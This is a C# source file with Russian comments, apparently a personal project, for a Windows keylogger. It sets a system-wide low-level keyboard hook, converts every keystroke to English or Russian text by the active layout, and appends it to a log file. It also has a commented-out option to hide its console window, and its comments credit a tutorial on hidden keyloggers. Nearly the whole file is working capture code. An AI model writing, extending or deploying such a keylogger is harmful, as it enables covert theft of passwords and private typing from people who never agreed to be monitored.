using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;


/// <summary>
/// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
/// Нерешённые проблемы: 
/// 1. Замена всех специальных символов в лог.файле на адекватное отображение. Например, 
/// aбв [leftArrow] [Backspace] -> ав. 
/// 2. Замена символов, если нажат, например, шифт. 
/// Клавиша без шифта: .
/// Клавиша во время зажатого шифта: ,
/// 3. Отлов комбинаций клавиш: 
/// например, Shift+Alt = смена языка. 
/// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
/// </summary>
namespace PopitkaSto
{
    /// <summary>
    /// Источник, откуда был украден 
    /// код с хуками: 
    /// https://www.businessinsider.com/how-to-create-a-simple-hidden-console-keylogger-in-c-sharp-2012-1
    /// -----------------------------------------------------------------------------------------------------
    /// Источник, откуда был украден способ
    /// определения языка раскладки: https://www.cyberforum.ru/windows-forms/thread354014.html
    /// </summary>
    class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        /// <summary>
        /// Словарь, в котором будет храниться актуальная замена символов. 
        /// Для русского и для английского языка словари разные, а ключи - одинаковые.
        /// Чтобы не вызывать конфликта, специфичные словари помещены в отдельные классы, 
        /// а в самом коде будет вызываться только один этот словарь, 
        /// которому, в зависимости от языка, будет присваиваться либо 
        /// русский словарь, либо английский. 
        /// </summary>
        public static Dictionary<Keys, string> dict;

        public static void Main()
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                dict = DictENG.convertSymbols;
                string stringToFile = "";
                int key = Marshal.ReadInt32(lParam);


                stringToFile = ((Keys)key).ToString().ToLower();
                if ((Keys)key == Keys.CapsLock) stringToFile = stringToFile.ToUpper();
                //if ((Keys)vkCode == Keys.Shift) mem = mem.ToUpper();
                //if ((Keys)vkCode == Keys.Space) mem = " ";

                string newSymb = "";
                // пытаемся спарсить символ из словаря
                if (dict.TryGetValue((Keys)key, out newSymb))
                {
                    stringToFile = newSymb;
                }


                string newMem = "";
                if (GetKeyboardLayoutId() == "RUS")
                {
                    dict = DictRU.translate;
                    if (dict.TryGetValue((Keys)key, out newMem)) stringToFile = newMem;
                }

                if ((Keys)key == Keys.Capital) stringToFile = stringToFile.ToUpper();
                Console.Write(stringToFile);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write(stringToFile);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static string GetKeyboardLayoutId()
        {

            _InstalledInputLanguages = InputLanguage.InstalledInputLanguages;

            // Получаем хендл активного окна
            IntPtr hWnd = GetForegroundWindow();
            // Получаем номер потока активного окна
            int WinThreadProcId = GetWindowThreadProcessId(hWnd, out _ProcessId);

            // Получаем раскладку
            IntPtr KeybLayout = GetKeyboardLayout(WinThreadProcId);
            // Циклом перебираем все установленные языки для проверки идентификатора
            for (int i = 0; i < _InstalledInputLanguages.Count; i++)
            {
                if (KeybLayout == _InstalledInputLanguages[i].Handle)
                {
                    _CurrentInputLanguage = _InstalledInputLanguages[i].Culture.ThreeLetterWindowsLanguageName.ToString();
                }
            }
            return _CurrentInputLanguage;

        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetKeyboardLayout(int WindowsThreadProcessID);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowThreadProcessId(IntPtr handleWindow, out int lpdwProcessID);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetForegroundWindow();

        private static InputLanguageCollection _InstalledInputLanguages;
        // Идентификатор активного потока
        private static int _ProcessId;
        // Текущий язык ввода
        private static string _CurrentInputLanguage;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);



        // функция, возвращающая дескриптор активного окна 
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        public static class DictENG
        {
            public static Dictionary<Keys, string> convertSymbols = new Dictionary<Keys, string>
        {
            { Keys.Space, " " },
            { Keys.Enter, "\n" },
            { Keys.LShiftKey, " [LShift] " },
            { Keys.Oemcomma, "," },
            { Keys.LControlKey, " [LCtrl] " },
            { Keys.D1, "!" },
            { Keys.D7, "?" },
            { Keys.OemOpenBrackets, "[" },
            { Keys.OemCloseBrackets, "]" },
            { Keys.Down, " [ArrowDown] "},
            { Keys.Up, " [ArrowUp]" },
            { Keys.Left, " [ArrowLeft] " },
            { Keys.Right, " [ArrowRight] " },
            { Keys.Oem7, "\"" },
            { Keys.Oem5, "\\" },
            { Keys.OemQuestion, "?" },
            { Keys.Back, " [BackSpace] " },
            { Keys.Oemplus, "+" },
            { Keys.OemMinus, "-"},
            { Keys.D0, "0" },
            { Keys.D9, "9" },
            { Keys.D8, "8" },
            //{ Keys.D7, "7" },
            { Keys.D6, "6" },
            { Keys.D5, "5" },
            { Keys.D4, "4" },
            { Keys.D3, "3" },
            { Keys.D2, "2" },
            { Keys.Oemtilde, "`" },
            { Keys.Tab, " [TAB] " },
            { Keys.Decimal, "."},
            { Keys.OemPeriod, "." },
            { Keys.Divide, "/" },
            { Keys.Multiply, "*" },
            { Keys.Subtract, "-"},
            { Keys.NumPad0, " [NumPad 0] " },
            { Keys.NumPad1, " [NumPad 1] " },
            { Keys.NumPad2, " [NumPad 2] " },
            { Keys.NumPad3, " [NumPad 3] " },
            { Keys.NumPad4, " [NumPad 4] " },
            { Keys.NumPad5, " [NumPad 5] " },
            { Keys.NumPad6, " [NumPad 6] " },
            { Keys.NumPad7, " [NumPad 7] " },
            { Keys.NumPad8, " [NumPad 8] " },
            { Keys.NumPad9, " [NumPad 9] " },
            { Keys.Insert, " [INSERT] " },
            { Keys.End, " [END] " },
            { Keys.PageUp, " [PageUp] "},
            { Keys.Next, " [PageDown] "},
            { Keys.Delete, " [Delete] "},
            { Keys.Home, " [Home] " },
            { Keys.Scroll, " [Scroll] " },
            { Keys.PrintScreen, " [PrintScreen] " },
            { Keys.F12, " [F12] " },
            { Keys.F11, " [F11] " },
            { Keys.F10, " [F10] " },
            { Keys.F9, " [F9] " },
            { Keys.F8, " [F8] " },
            { Keys.F7, " [F7] " },
            { Keys.F6, " [F6] " },
            { Keys.F5, " [F5] " },
            { Keys.F4, " [F4] " },
            { Keys.F3, " [F3] " },
            { Keys.F2, " [F2] " },
            { Keys.F1, " [F1] " },

    };
        }

        public static class DictRU
        {
            public static Dictionary<Keys, string> translate = new Dictionary<Keys, string>
        {
            { Keys.Q, "й" },
            { Keys.W, "ц" },
            { Keys.E, "у" },
            { Keys.R, "к" },
            { Keys.T, "е" },
            { Keys.Y, "н" },
            { Keys.U, "г" },
            { Keys.I, "ш" },
            { Keys.O, "щ" },
            { Keys.P, "з" },
            { Keys.OemOpenBrackets, "х" },
            { Keys.Oem6, "ъ" },
            { Keys.A, "ф" },
            { Keys.S, "ы" },

            { Keys.D, "в" },
            { Keys.F, "а" },
            { Keys.G, "п" },
            { Keys.H, "р" },
            { Keys.J, "о" },
            { Keys.K, "л" },
            { Keys.L, "д" },
            { Keys.Oem1, "ж" },
            { Keys.Oem7, "э" },
            { Keys.Z, "я" },
            { Keys.X, "ч" },
            { Keys.C, "с" },
            { Keys.V, "м" },
            { Keys.B, "и" },
            { Keys.N, "т" },
            { Keys.M, "ь" },
            { Keys.Oemcomma, "б" },
            { Keys.OemPeriod, "ю" },
            { Keys.OemQuestion, "." },
            { Keys.Oemtilde, "ё" },
        };
        }



    }
}
